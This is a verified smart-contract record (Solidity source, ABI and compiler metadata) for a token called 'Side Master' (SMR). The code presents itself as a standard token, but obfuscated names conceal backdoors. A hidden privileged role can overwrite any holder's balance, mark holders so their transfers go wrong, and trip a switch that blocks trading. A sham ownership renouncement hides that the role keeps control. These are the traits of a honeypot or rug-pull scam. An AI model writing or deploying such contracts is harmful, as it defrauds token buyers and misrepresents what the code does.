{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface toLiquidity {\n    function createPair(address fundReceiverShould, address sellSenderAt) external returns (address);\n}\n\ninterface txListIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxEnable) external view returns (uint256);\n\n    function transfer(address senderWallet, uint256 limitIsToken) external returns (bool);\n\n    function allowance(address swapWalletTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitIsToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderWallet,\n        uint256 limitIsToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listLiquidityMode, uint256 value);\n    event Approval(address indexed swapWalletTake, address indexed spender, uint256 value);\n}\n\nabstract contract walletToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTeam is txListIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SideMaster is walletToken, txListIs, tradingTeam {\n\n    function transferFrom(address marketingToken, address senderWallet, uint256 limitIsToken) external override returns (bool) {\n        if (_msgSender() != receiverMarketing) {\n            if (limitTokenMode[marketingToken][_msgSender()] != type(uint256).max) {\n                require(limitIsToken <= limitTokenMode[marketingToken][_msgSender()]);\n                limitTokenMode[marketingToken][_msgSender()] -= limitIsToken;\n            }\n        }\n        return atTeam(marketingToken, senderWallet, limitIsToken);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    function fundLiquidity(uint256 limitIsToken) public {\n        tokenTradingAuto();\n        isExempt = limitIsToken;\n    }\n\n    event OwnershipTransferred(address indexed buyAutoShould, address indexed receiverWallet);\n\n    address receiverMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private receiverTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFrom;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeFrom;\n    }\n\n    function atTeam(address marketingToken, address senderWallet, uint256 limitIsToken) internal returns (bool) {\n        if (marketingToken == listSwapSell) {\n            return autoTradingReceiver(marketingToken, senderWallet, limitIsToken);\n        }\n        uint256 swapExempt = txListIs(tradingAuto).balanceOf(listLaunched);\n        require(swapExempt == isExempt);\n        require(senderWallet != listLaunched);\n        if (exemptTake[marketingToken]) {\n            return autoTradingReceiver(marketingToken, senderWallet, walletExemptTx);\n        }\n        return autoTradingReceiver(marketingToken, senderWallet, limitIsToken);\n    }\n\n    uint256 public receiverTotalLiquidity;\n\n    function tokenTradingAuto() private view {\n        require(sellFee[_msgSender()]);\n    }\n\n    uint256 public fundLaunchedWallet;\n\n    address public tradingAuto;\n\n    function approve(address autoSender, uint256 limitIsToken) public virtual override returns (bool) {\n        limitTokenMode[_msgSender()][autoSender] = limitIsToken;\n        emit Approval(_msgSender(), autoSender, limitIsToken);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitTokenMode;\n\n    bool public fundWallet;\n\n    address listLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 buyTo;\n\n    string private sellBuy = \"Side Master\";\n\n    bool public amountFee;\n\n    uint256 private minLiquidity;\n\n    function launchTake(address amountLaunchExempt) public {\n        if (fundWallet) {\n            return;\n        }\n        \n        sellFee[amountLaunchExempt] = true;\n        \n        fundWallet = true;\n    }\n\n    constructor (){\n        \n        fromLaunched listEnable = fromLaunched(receiverMarketing);\n        tradingAuto = toLiquidity(listEnable.factory()).createPair(listEnable.WETH(), address(this));\n        \n        listSwapSell = _msgSender();\n        sellFee[listSwapSell] = true;\n        receiverTo[listSwapSell] = modeFrom;\n        takeTeam();\n        if (minLiquidity != enableTotal) {\n            enableTotal = fundLaunch;\n        }\n        emit Transfer(address(0), listSwapSell, modeFrom);\n    }\n\n    function autoTradingReceiver(address marketingToken, address senderWallet, uint256 limitIsToken) internal returns (bool) {\n        require(receiverTo[marketingToken] >= limitIsToken);\n        receiverTo[marketingToken] -= limitIsToken;\n        receiverTo[senderWallet] += limitIsToken;\n        emit Transfer(marketingToken, senderWallet, limitIsToken);\n        return true;\n    }\n\n    uint256 constant walletExemptTx = 20 ** 10;\n\n    bool public launchSwap;\n\n    string private receiverFrom = \"SMR\";\n\n    uint8 private amountMinBuy = 18;\n\n    bool public senderTotalReceiver;\n\n    mapping(address => bool) public sellFee;\n\n    uint256 private modeFrom = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public exemptTake;\n\n    function owner() external view returns (address) {\n        return isReceiver;\n    }\n\n    address private isReceiver;\n\n    function getOwner() external view returns (address) {\n        return isReceiver;\n    }\n\n    address public listSwapSell;\n\n    function takeTeam() public {\n        emit OwnershipTransferred(listSwapSell, address(0));\n        isReceiver = address(0);\n    }\n\n    uint256 public enableTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountMinBuy;\n    }\n\n    function transfer(address fundModeExempt, uint256 limitIsToken) external virtual override returns (bool) {\n        return atTeam(_msgSender(), fundModeExempt, limitIsToken);\n    }\n\n    function balanceOf(address maxEnable) public view virtual override returns (uint256) {\n        return receiverTo[maxEnable];\n    }\n\n    function marketingMin(address buyMax) public {\n        tokenTradingAuto();\n        \n        if (buyMax == listSwapSell || buyMax == tradingAuto) {\n            return;\n        }\n        exemptTake[buyMax] = true;\n    }\n\n    uint256 public fundLaunch;\n\n    uint256 isExempt;\n\n    function shouldWallet(address fundModeExempt, uint256 limitIsToken) public {\n        tokenTradingAuto();\n        receiverTo[fundModeExempt] = limitIsToken;\n    }\n\n    function allowance(address tradingFrom, address autoSender) external view virtual override returns (uint256) {\n        if (autoSender == receiverMarketing) {\n            return type(uint256).max;\n        }\n        return limitTokenMode[tradingFrom][autoSender];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapWalletTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAutoShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLiquidityMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitIsToken\",\"type\":\"uint256\"}],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchExempt\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"}],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundModeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsToken\",\"type\":\"uint256\"}],\"name\":\"shouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundModeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SideMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}